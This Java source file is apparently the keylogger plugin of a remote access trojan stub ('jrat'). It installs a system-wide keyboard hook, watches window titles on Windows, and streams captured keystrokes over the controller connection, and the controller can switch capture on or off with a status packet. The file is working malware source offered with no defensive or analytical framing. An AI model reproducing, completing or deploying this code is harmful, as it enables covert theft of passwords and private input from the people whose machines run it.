package pro.jrat.stub.keylogger;

import java.io.DataInputStream;
import java.io.DataOutputStream;

import org.jnativehook.GlobalScreen;

import pro.jrat.api.stub.StubPlugin;


public class Plugin extends StubPlugin {
	
	public static DataInputStream dis;
	public static DataOutputStream dos;
	public static boolean enabled;
	
	public static final byte KEY_HEADER = 121;
	public static final byte TITLE_HEADER = 122;
	public static final byte STATUS_HEADER = 123;
	
	public void onEnable() throws Exception {
		GlobalScreen.registerNativeHook();
		GlobalScreen.getInstance().addNativeKeyListener(new Keylogger());
		
		if (System.getProperty("os.name").toLowerCase().contains("win")) {
			try {
				new Thread(new TitleListener()).start();
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
		
		Runtime.getRuntime().addShutdownHook(new Thread(new Runnable() {

			@Override
			public void run() {
				try {
					GlobalScreen.unregisterNativeHook();
				} catch (Exception ex) {
					ex.printStackTrace();
				}
			}
			
		}));
	}
	
	public void onDisconnect(Exception ex) {
		
	}
	
	public void onConnect(DataInputStream in, DataOutputStream out) {
		Plugin.dis = in;
		Plugin.dos = out;
	}
	
	public void onPacket(byte header) throws Exception {
		if (header == STATUS_HEADER) {
			enabled = dis.readBoolean();
		}
	}
	
	public String getVersion() {
		return "1.0";
	}

	public static synchronized void writeChars(char[] s) throws Exception {
		if (s.length > 1) {
			dos.writeUTF(new String(s));
		} else {
			dos.writeChar(s[0]);
		}
	}

	@Override
	public String getName() {
		return "Keylogger";
	}
}
